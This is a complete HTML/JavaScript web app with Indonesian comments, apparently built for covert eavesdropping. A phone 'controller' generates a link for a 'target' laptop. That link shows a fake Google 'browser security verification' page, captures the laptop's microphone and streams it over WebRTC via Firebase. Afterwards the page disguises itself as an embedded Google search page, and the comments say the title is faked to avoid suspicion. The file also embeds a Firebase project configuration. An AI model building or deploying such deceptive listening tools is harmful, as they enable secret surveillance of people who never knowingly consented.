<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Search</title> <!-- Judul disamarkan agar tidak mencurigakan di Laptop -->
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        .hidden { display: none !important; }
        /* Animasi loading halus */
        @keyframes pulse-soft {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .animate-pulse-soft { animation: pulse-soft 2s infinite; }
    </style>
</head>
<body class="bg-slate-950 text-slate-200 font-sans min-h-screen flex flex-col">

    <!-- HEADER (Hanya muncul di HP/Mode Normal) -->
    <header id="mainHeader" class="p-4 border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-10 flex justify-between items-center">
        <div class="flex items-center gap-2">
            <i class="fa-solid fa-satellite-dish text-cyan-400"></i>
            <h1 class="font-bold text-lg">AudioBridge <span class="text-xs text-orange-400">Controller</span></h1>
        </div>
        <div id="connectionStatus" class="text-xs font-mono bg-slate-800 px-2 py-1 rounded text-slate-400">
            OFFLINE
        </div>
    </header>

    <main class="flex-1 flex flex-col items-center justify-center p-6 w-full max-w-md mx-auto relative">
        
        <!-- Notifikasi -->
        <div id="toast" class="hidden fixed top-20 left-1/2 transform -translate-x-1/2 bg-slate-800 border border-slate-700 text-white px-4 py-2 rounded-lg shadow-xl text-sm z-50"></div>

        <!-- HALAMAN 1: DASHBOARD HP (PEMBUAT LINK) -->
        <div id="controllerPage" class="w-full space-y-6">
            <div class="text-center space-y-2">
                <h2 class="text-2xl font-bold text-white">Panel Kontrol (HP)</h2>
                <p class="text-slate-400 text-sm">Buat link untuk dibuka di Laptop target.</p>
            </div>

            <!-- Kartu Status HP -->
            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 text-center space-y-4">
                <div id="loader" class="hidden text-cyan-500 text-4xl mb-4 animate-spin">
                    <i class="fa-solid fa-circle-notch"></i>
                </div>
                
                <div id="linkArea" class="hidden space-y-4 animate-in fade-in zoom-in duration-300">
                    <div class="text-emerald-400 text-5xl mb-2">
                        <i class="fa-solid fa-check-circle"></i>
                    </div>
                    <h3 class="text-lg font-bold text-white">Room Siap!</h3>
                    <p class="text-xs text-slate-500">Kirim link ini ke Laptop target:</p>
                    
                    <div onclick="copyTargetLink()" class="bg-black/30 p-3 rounded-lg border border-slate-700 cursor-pointer hover:border-cyan-500 transition-colors break-all">
                        <p id="targetUrlDisplay" class="text-cyan-400 font-mono text-xs underline decoration-dotted">Generating...</p>
                    </div>

                    <button onclick="copyTargetLink()" class="w-full bg-cyan-600 hover:bg-cyan-500 text-white font-bold py-3 rounded-xl flex items-center justify-center gap-2">
                        <i class="fa-regular fa-copy"></i> SALIN LINK TARGET
                    </button>

                    <div class="border-t border-slate-800 pt-4 mt-4">
                        <p class="text-xs text-slate-400 mb-2">Status Target:</p>
                        <div id="waitingStatus" class="text-yellow-500 font-mono text-sm animate-pulse">
                            MENUNGGU LAPTOP MEMBUKA LINK...
                        </div>
                    </div>
                </div>

                <!-- Tombol Start untuk HP -->
                <button id="btnCreateRoom" onclick="createRoomAsController()" class="w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-900/20 text-lg flex justify-center items-center gap-2">
                    <i class="fa-solid fa-key"></i> BUAT AKSES TARGET
                </button>
            </div>
            
            <div id="audioControls" class="hidden mt-4">
                 <button id="muteRemoteBtn" onclick="toggleRemoteAudio()" class="w-full bg-slate-800 text-slate-300 py-3 rounded-xl border border-slate-700">
                    <i class="fa-solid fa-volume-high"></i> Suara Target: AKTIF
                 </button>
            </div>
        </div>

        <!-- HALAMAN 2: TAMPILAN LAPTOP (YANG AKAN DIKAMUFLASE) -->
        <div id="targetPage" class="hidden w-full text-center space-y-6">
            
            <!-- Layar "Klik untuk Mulai" (Wajib browser policy) -->
            <div id="startOverlay" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center">
                <div class="max-w-md w-full p-8 text-center space-y-6">
                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="h-12 mx-auto mb-8">
                    <p class="text-gray-600">Verifikasi keamanan browser...</p>
                    <button onclick="startTargetMode()" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-3 rounded text-sm font-medium shadow-md transition-transform active:scale-95">
                        Lanjutkan ke Google
                    </button>
                    <p class="text-xs text-gray-400 mt-4">Connection ID: <span id="targetRoomIdDisplay">...</span></p>
                </div>
            </div>

            <!-- Layar Kamuflase Google (Muncul setelah connect) -->
            <div id="camouflageLayer" class="hidden fixed inset-0 bg-white z-40">
                <iframe src="https://www.google.com/webhp?igu=1" class="w-full h-full border-0" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
                <!-- Indikator Rahasia (Titik merah kecil di pojok kanan bawah) -->
                <div id="liveIndicator" class="fixed bottom-1 right-1 w-2 h-2 bg-red-500 rounded-full animate-pulse z-50" title="Transmitting..."></div>
            </div>
        </div>

    </main>

    <!-- Audio Element (Untuk HP mendengarkan Laptop) -->
    <audio id="remoteAudio" autoplay playsinline class="hidden"></audio>

    <!-- Firebase Script -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js';
        import { getAuth, signInAnonymously, onAuthStateChanged } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-auth.js';
        import { getFirestore, collection, doc, setDoc, getDoc, onSnapshot, updateDoc, addDoc, serverTimestamp } from 'https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore.js';

        const firebaseConfig = {
            apiKey: "AIzaSyDbhegMTo3-AG4tUPQJkbwlXMbUZmdjVTk",
            authDomain: "p2paudio-fdbde.firebaseapp.com",
            projectId: "p2paudio-fdbde",
            storageBucket: "p2paudio-fdbde.firebasestorage.app",
            messagingSenderId: "734885014321",
            appId: "1:734885014321:web:e6fef64fb7d58802cc9e10"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const auth = getAuth(app);

        // --- GLOBAL VARIABLES ---
        let user = null;
        let peerConnection = null;
        let localStream = null;
        let roomId = null;
        const servers = {
            iceServers: [{ urls: ['stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] }]
        };

        // --- AUTH ---
        signInAnonymously(auth).then(() => console.log("Auth OK")).catch(console.error);
        onAuthStateChanged(auth, (u) => {
            if (u) {
                user = u;
                document.getElementById('connectionStatus').textContent = "ONLINE";
                document.getElementById('connectionStatus').className = "text-xs font-mono bg-emerald-900/50 px-2 py-1 rounded text-emerald-400";
                
                // Cek apakah ini Laptop yang membuka Link?
                checkIfTarget();
            }
        });

        // --- LOGIC 1: HP (CONTROLLER) ---
        
        window.createRoomAsController = async () => {
            if (!user) return alert("Tunggu koneksi internet...");
            
            // 1. Generate ID Unik
            roomId = Math.random().toString(36).substring(2, 8).toUpperCase();
            
            // UI Update
            document.getElementById('btnCreateRoom').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');

            try {
                // 2. Setup WebRTC (HP sebagai Caller/Receiver Audio)
                peerConnection = new RTCPeerConnection(servers);
                
                // HP hanya menerima audio (transceiver recvonly)
                peerConnection.addTransceiver('audio', { direction: 'recvonly' });

                // Handle Audio Masuk (Dari Laptop)
                peerConnection.ontrack = (event) => {
                    const remoteAudio = document.getElementById('remoteAudio');
                    remoteAudio.srcObject = event.streams[0];
                    remoteAudio.play().catch(console.error);
                    
                    document.getElementById('waitingStatus').textContent = "TERHUBUNG: SUARA MASUK ðŸ”Š";
                    document.getElementById('waitingStatus').className = "text-emerald-400 font-bold text-sm animate-pulse";
                    document.getElementById('audioControls').classList.remove('hidden');
                };

                // ICE Candidates Logic
                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        addDoc(collection(db, `calls/${roomId}/controllerCandidates`), event.candidate.toJSON());
                    }
                };

                // 3. Create Offer
                const offer = await peerConnection.createOffer();
                await peerConnection.setLocalDescription(offer);

                // 4. Save to Firebase
                await setDoc(doc(db, `calls/${roomId}`), {
                    offer: { type: offer.type, sdp: offer.sdp },
                    createdAt: serverTimestamp(),
                    role: 'controller_waiting' 
                });

                // 5. Listen for Target (Laptop) Answer
                onSnapshot(doc(db, `calls/${roomId}`), (snapshot) => {
                    const data = snapshot.data();
                    if (!peerConnection.currentRemoteDescription && data?.answer) {
                        const answer = new RTCSessionDescription(data.answer);
                        peerConnection.setRemoteDescription(answer);
                    }
                });

                // Listen for Target Candidates
                onSnapshot(collection(db, `calls/${roomId}/targetCandidates`), (snapshot) => {
                    snapshot.docChanges().forEach((change) => {
                        if (change.type === 'added') {
                            peerConnection.addIceCandidate(new RTCIceCandidate(change.doc.data()));
                        }
                    });
                });

                // 6. Tampilkan Link
                document.getElementById('loader').classList.add('hidden');
                document.getElementById('linkArea').classList.remove('hidden');
                
                const fullUrl = `${window.location.origin}${window.location.pathname}?target=true&room=${roomId}`;
                document.getElementById('targetUrlDisplay').textContent = fullUrl;

            } catch (err) {
                alert("Error: " + err.message);
                document.getElementById('loader').classList.add('hidden');
                document.getElementById('btnCreateRoom').classList.remove('hidden');
            }
        };

        window.copyTargetLink = () => {
            const url = document.getElementById('targetUrlDisplay').textContent;
            navigator.clipboard.writeText(url);
            showToast("Link disalin! Kirim ke Laptop.");
        };

        // --- LOGIC 2: LAPTOP (TARGET) ---

        function checkIfTarget() {
            const params = new URLSearchParams(window.location.search);
            if (params.get('target') === 'true' && params.get('room')) {
                roomId = params.get('room');
                
                // Ubah Tampilan total
                document.getElementById('mainHeader').classList.add('hidden');
                document.getElementById('controllerPage').classList.add('hidden');
                document.getElementById('targetPage').classList.remove('hidden');
                document.getElementById('targetRoomIdDisplay').textContent = roomId;
                document.title = "Google"; // Ubah tab title
            }
        }

        // Dipanggil saat Laptop klik tombol "Lanjutkan ke Google"
        window.startTargetMode = async () => {
            const btn = document.querySelector('#startOverlay button');
            btn.textContent = "Connecting...";
            btn.disabled = true;

            try {
                // 1. Ambil Mic Laptop
                localStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                
                // 2. Setup Connection
                peerConnection = new RTCPeerConnection(servers);
                localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));

                // 3. Ambil Offer dari HP
                const callDoc = doc(db, `calls/${roomId}`);
                const snapshot = await getDoc(callDoc);
                
                if (!snapshot.exists()) {
                    alert("Link kadaluarsa atau salah.");
                    return;
                }

                // ICE Handling
                peerConnection.onicecandidate = (event) => {
                    if (event.candidate) {
                        addDoc(collection(db, `calls/${roomId}/targetCandidates`), event.candidate.toJSON());
                    }
                };

                // Set Remote Description (Offer dari HP)
                const offerData = snapshot.data().offer;
                await peerConnection.setRemoteDescription(new RTCSessionDescription(offerData));

                // Create Answer
                const answer = await peerConnection.createAnswer();
                await peerConnection.setLocalDescription(answer);

                // Kirim Answer balik ke HP
                await updateDoc(callDoc, {
                    answer: { type: answer.type, sdp: answer.sdp },
                    connectedAt: serverTimestamp()
                });

                // Listen Candidates dari HP
                onSnapshot(collection(db, `calls/${roomId}/controllerCandidates`), (snapshot) => {
                    snapshot.docChanges().forEach((change) => {
                        if (change.type === 'added') {
                            peerConnection.addIceCandidate(new RTCIceCandidate(change.doc.data()));
                        }
                    });
                });

                // 4. SUKSES - Masuk Mode Kamuflase
                peerConnection.onconnectionstatechange = () => {
                    if (peerConnection.connectionState === 'connected') {
                        document.getElementById('startOverlay').classList.add('hidden');
                        document.getElementById('camouflageLayer').classList.remove('hidden');
                        // Mencegah sleep (opsional, basic hack)
                        const noSleep = setInterval(() => { window.location.href = window.location.href }, 1800000); 
                    }
                };

            } catch (err) {
                alert("Gagal koneksi: Pastikan Izinkan Mikforon. " + err.message);
                btn.textContent = "Coba Lagi";
                btn.disabled = false;
            }
        };

        // --- UTILITIES ---
        window.toggleRemoteAudio = () => {
            const audioEl = document.getElementById('remoteAudio');
            const btn = document.getElementById('muteRemoteBtn');
            if (audioEl.muted) {
                audioEl.muted = false;
                btn.innerHTML = '<i class="fa-solid fa-volume-high"></i> Suara Target: AKTIF';
                btn.className = "w-full bg-slate-800 text-slate-300 py-3 rounded-xl border border-slate-700";
            } else {
                audioEl.muted = true;
                btn.innerHTML = '<i class="fa-solid fa-volume-xmark"></i> Suara Target: MUTE';
                btn.className = "w-full bg-red-900/30 text-red-400 py-3 rounded-xl border border-red-900";
            }
        }

        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.classList.remove('hidden');
            setTimeout(() => t.classList.add('hidden'), 3000);
        }
    </script>
</body>
</html>
